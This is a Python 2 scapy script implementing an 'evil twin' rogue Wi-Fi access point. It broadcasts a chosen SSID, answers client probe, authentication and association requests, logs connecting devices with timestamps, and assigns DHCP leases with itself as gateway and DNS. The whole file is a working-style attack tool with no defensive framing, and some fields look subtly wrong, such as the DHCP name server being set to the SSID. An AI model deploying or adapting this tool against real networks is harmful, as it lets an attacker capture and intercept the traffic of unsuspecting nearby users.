import random
import time
from scapy.all import *

class Router:

	def __init__(self, netSSID, iface='wlan0mon', origin_add='11:22:22:33:44:55'):

		self.power = False
		self.netSSID = netSSID
		self.iface = iface
		self.mac = origin_add
		self.DNSServer = '192.168.0.1'
		self.gateway = '192.168.0.1'
		self.dhcp_server = '192.168.0.1'
		self.Dispositives = []
		self.Logs = dict()
		self.SC = 0
		self.ack = 0

		

	def send_probe_response(self, packet):
		rates = self.get_rates(packet)
		self.SC += 16
		frame_probe_response = RadioTap() /  \
					Dot11(subtype=5L, type='Management', proto=0L, addr1=packet[Dot11].addr2, addr2=self.mac, addr3=self.mac, SC=self.SC) /  \
					Dot11ProbeResp(timestamp=time.time(), cap="ESS") /  \
					Dot11Elt(ID='SSID', info=self.netSSID, len=len(self.netSSID)) /  \
					Dot11Elt(ID='Rates', info=rates[0]) /  \
					Dot11Elt(ID='DSset', info='\x01') /  \
					Dot11Elt(ID='ESRates', info=rates[1]) / \
					Dot11Elt(ID=127, len=8, info='\x04\x00\x00\x02\x00\x00\x00@') /  \
					Dot11Elt(ID=59, len=2, info='Q\x00')

		sendp(frame_probe_response, iface = self.iface)
		print(' [*] Sending probe response to ' + str(packet[Dot11].addr2))

	def send_auth_response(self, packet):
		if packet[Dot11].addr2 != self.mac:
			self.SC += 16

			frame_auth = RadioTap() /  \
						Dot11(subtype=11L, type='Management', proto=0L, ID=packet[Dot11].ID, addr1=packet[Dot11].addr2, addr2=self.mac, addr3=self.mac, addr4=packet[Dot11].addr2, SC=self.SC) /  \
						Dot11Auth(algo=0, seqnum=2, status=0) /  \
						Dot11Elt(ID='SSID', info=self.netSSID, len=len(self.netSSID)) 

			sendp(frame_auth, iface = self.iface)
			print(' [*] Sending authorization response to ' + str(packet[Dot11].addr2))

	def send_association_response(self, packet):
		rates = self.get_rates(packet)
		self.SC += 16
		frame_asso = RadioTap()  /  \
			Dot11(subtype=1L, type='Management', proto=0L, ID=packet[Dot11].ID, addr1=packet[Dot11].addr2, addr2=self.mac, addr3=self.mac, addr4 = packet[Dot11].addr2,SC=self.SC) /  \
			Dot11AssoResp(AID=2) /  \
			Dot11Elt(ID='Rates', info=rates[0]) /  \
			Dot11Elt(ID='ESRates', info=rates[1]) /  \
			Dot11Elt(ID='SSID',info=self.netSSID, len=len(self.netSSID))

		sendp(frame_asso, iface = self.iface)
		self.Dispositives.append(packet.addr2)
		self.Logs[packet.addr2]=time.localtime()
		print(' [*] Sending associantion response to ' + str(packet[Dot11].addr2))

	def send_clear_to_send(self, packet):
		self.SC += 16
		frame_clear_to_send = RadioTap()  /  \
			Dot11(subtype=13L, type='Control', proto=0L, ID=packet[Dot11].ID, addr1=packet[Dot11].addr2) 
		sendp(frame_clear_to_send, iface = self.iface)
		print(' [*] Sending clear to send response to ' + str(packet[Dot11].addr2))


	def send_dhcp_response(self, packet):
		dot11 = packet.getlayer(Dot11)
		ip = packet.getlayer(IP)
		udp = packet.getlayer(UDP)
		bootp = packet.getlayer(BOOTP)
		dhcp = packet.getlayer(DHCP)
		dhcp_message_type = None


		if not dhcp:
			return False

		for opt in dhcp.options:
			if opt[0] == 'message-type':
				dhcp_message_type = opt[1]

		if dhcp_message_type == 3:
			self.SC += 16
			client_ip = self.ip_generator()
			frame_dhcp_response = RadioTap()  /  \
					 Dot11(type='Data', ID=packet[Dot11].ID, addr1=packet[Dot11].addr2, addr2=self.mac, addr3=self.mac, SC=self.SC) /  \
					 IP(src=self.dhcp_server  ,dst=client_ip ) /  \
					 UDP(sport=udp.dport, 
					 	dport=udp.sport) /  \
					 BOOTP(op=2, 
					 	chaddr=Dot11.addr1, 
					 	siaddr=self.gateway, 
					 	yiaddr=client_ip, 
					 	xid=bootp.xid) /  \
					 DHCP(options=[('message-type', 5), 
					 			('requested-addr', client_ip), 
					 			('subnet_mask', '255.255.255.0'), 
					 			('router', self.gateway), 
					 			('name_server', self.netSSID)])

			sendp(frame_dhcp_response, iface=self.iface)
		print(' [*] Sending dhcp response to ' + str(packet[Dot11].addr2))

	def send_beacon(self):
		frame = RadioTap()/  \
				Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=self.mac, addr3=self.mac)/  \
				Dot11Beacon(cap='ESS', beacon_interval=100)/  \
				Dot11Elt(info=self.netSSID, len=len(self.netSSID))

		sendp(frame, iface=self.iface)

	def send_ack(self, packet):
		ack = RadioTap()/ \
		Dot11(proto=0L, FCfield=0L, subtype=13L, addr4=None, addr2=None, addr3=None, addr1=packet[Dot11].addr2, SC=None, type=1L)/ \
		Raw(load='\\x1d\\x06\\x10m')

		sendp(ack, iface=self.iface)
		print(' [*] Sending ack response to ' + str(packet[Dot11].addr2))

	def filtro(self, packet):

		if packet.haslayer(Dot11):
			if packet.haslayer(Dot11ProbeReq):
				self.send_probe_response(packet)

			if packet.haslayer(Dot11Auth):
				self.send_auth_response(packet)

			if packet.haslayer(Dot11AssoReq):
				self.send_association_response(packet)
				#self.send_clear_to_send(packet)

			if packet.haslayer(LLC):
				self.send_ack(packet)

			if packet.haslayer(DHCP):
				self.send_dhcp_response(packet)

		if packet.haslayer(Ether):

			if packet[Ether].dst != self.mac:
				return

			if packet.haslayer(DHCP):
				self.send_dhcp_response(packet)

	def get_rates(self, packet):
		while Dot11Elt in packet:
			packet = packet[Dot11Elt]

			if packet.ID == 1:
				rates = packet.info

			elif packet.ID == 50:
				esrates = packet.info
			packet = packet.payload

		return[rates, esrates]

	def listen(self):
		try:
			while self.power == True:
				sniff(iface=self.iface, prn=self.filtro,timeout=5)
		except KeyboardInterrupt:
			return

	def exposing(self):
		while self.power == True:
			time.sleep(1)
			self.send_beacon()


	def turn_on(self):
		self.power = True

	def turn_off(self):
		self.power = False

	def state(self):
		if self.power:
			print(' [*] ENCENDIDO')
		else:
			print(' [*] APAGADO')

	def ip_generator(self):
		client_ip = '192.168.0.' + str(random.randint(2,254))
		return client_ip

if __name__ == '__main__':
	
	evil_twin = Router("John_Snow")
	evil_twin.turn_on()
	evil_twin.state()
	evil_twin.listen()

